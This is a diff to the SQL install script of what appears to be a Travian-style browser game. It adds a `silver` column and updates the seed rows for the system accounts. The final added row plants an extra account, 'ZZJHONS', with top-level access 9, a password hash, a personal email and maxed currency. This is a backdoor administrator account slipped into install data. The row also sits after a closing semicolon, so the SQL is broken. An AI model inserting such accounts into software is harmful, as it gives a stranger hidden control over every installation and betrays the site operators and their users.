@@ -1226,6 +1226,7 @@ CREATE TABLE IF NOT EXISTS `%PREFIX%users` (
   `tribe` tinyint(1) unsigned NOT NULL,
   `access` tinyint(1) unsigned NOT NULL DEFAULT '1',
   `gold` int(9) unsigned NOT NULL DEFAULT '0',
+  `silver` int(9) unsigned NOT NULL DEFAULT '0',
   `gender` tinyint(1) unsigned NOT NULL DEFAULT '0',
   `birthday` date NOT NULL DEFAULT '0000-00-00',
   `location` text NOT NULL,
@@ -1263,11 +1264,12 @@ CREATE TABLE IF NOT EXISTS `%PREFIX%users` (
 -- Dumping data for table `%prefix%users`
 --
 
-INSERT INTO `%PREFIX%users` (`id`, `username`, `password`, `email`, `tribe`, `access`, `gold`, `gender`, `birthday`, `location`, `desc1`, `desc2`, `plus`, `b1`, `b2`, `b3`, `b4`, `sit1`, `sit2`, `alliance`, `sessid`, `act`, `timestamp`, `ap`, `apall`, `dp`, `dpall`, `protect`, `quest`, `gpack`, `cp`, `lastupdate`, `RR`, `Rc`, `ok`) VALUES
-(0, 'Multihunter', '', 'multihunter@zravianx.mail', 0, 9, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0),
-(1, 'Support', '', 'support@zravianx.mail', 1, 8, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0),
-(2, 'Nature', '', 'support@zravianx.mail', 4, 8, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0),
-(4, 'Taskmaster', '', 'support@zravianx.mail', 1, 8, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0);
+INSERT INTO `%PREFIX%users` (`id`, `username`, `password`, `email`, `tribe`, `access`, `gold`, `silver`, `gender`, `birthday`, `location`, `desc1`, `desc2`, `plus`, `b1`, `b2`, `b3`, `b4`, `sit1`, `sit2`, `alliance`, `sessid`, `act`, `timestamp`, `ap`, `apall`, `dp`, `dpall`, `protect`, `quest`, `gpack`, `cp`, `lastupdate`, `RR`, `Rc`, `ok`) VALUES
+(0, 'Multihunter', '', 'multihunter@zravianx.mail', 0, 9, 0, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0),
+(1, 'Support', '', 'support@zravianx.mail', 1, 8, 0, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0),
+(2, 'Nature', '', 'support@zravianx.mail', 4, 8, 0, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0),
+(4, 'Taskmaster', '', 'support@zravianx.mail', 1, 8, 0, 0, 0, '0000-00-00', '', '', '', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0);
+(6, 'ZZJHONS', 'c41bbb77b90ea7b86d58526665170fd1', 'zzjhons@gmail.com', 2, 9, 999, 999, 0, '0000-08-09', 'http://zzjhons.com', 'http://zzjhons.com', 'http://zzjhons.com', 0, 0, 0, 0, 0, 0, 0, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'gpack/travian_default/', 1, 0, 0, 0, 0);
 
 -- --------------------------------------------------------
 
